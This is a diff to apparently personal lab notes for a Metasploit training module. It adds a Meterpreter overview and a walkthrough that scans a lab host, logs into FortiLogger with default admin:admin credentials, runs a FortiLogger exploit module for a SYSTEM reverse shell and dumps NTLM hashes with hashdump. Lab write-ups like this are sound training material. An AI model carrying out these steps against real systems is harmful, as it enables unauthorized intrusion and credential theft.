@@ -131,6 +131,74 @@ msf -> `search sudo 1.8.31`
 
 `cat flag.txt`
 
+{% embed url="https://www.youtube.com/watch?v=we0cYx37lMo" %}
+
+### Meterpreter
+
+* meterpreter payload is a specific type of multi-faceted extensible payload that uses DLL injection to establish connection
+* difficult to detect using simple checks, can be configured to be persistent across reboots or system changes...
+* resides entirely in the memory of the remote host...leaves no traces on HDD
+* "swiss army knife of pentesting"
 
 
-[https://www.youtube.com/watch?v=we0cYx37lMo](https://www.youtube.com/watch?v=we0cYx37lMo)
+
+#### Questions
+
+Given IP: `10.129.203.65`
+
+1. Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?
+
+`sudo service postgresql status`
+
+`sudo systemctl start postgresql`
+
+`sudo msfdb init`
+
+`sudo msfdb status`
+
+`sudo msfdb run`
+
+msf -> `db_nmap -sV -p- -T5 -A 10.129.203.65`
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+msf -> `hosts`
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+msf -> `services`
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+5000 -> HTTP -> go to website 10.129.203.65:5000
+
+* it is running FORTILOGGER
+* tried credentials admin:admin -> worked
+
+msf -> `search FortiLogger`
+
+msf -> `use 0`
+
+msf -> `set LHOST tun0`
+
+msf -> `set RHOSTS 10.129.203.65`
+
+msf -> `run`
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+`shell`
+
+`whoami`
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+ANSWER: **`nt authority\system`**
+
+2. Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.
+
+msf -> `exit`
+
+msf -> `run post/windows/gather/hashdump`
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
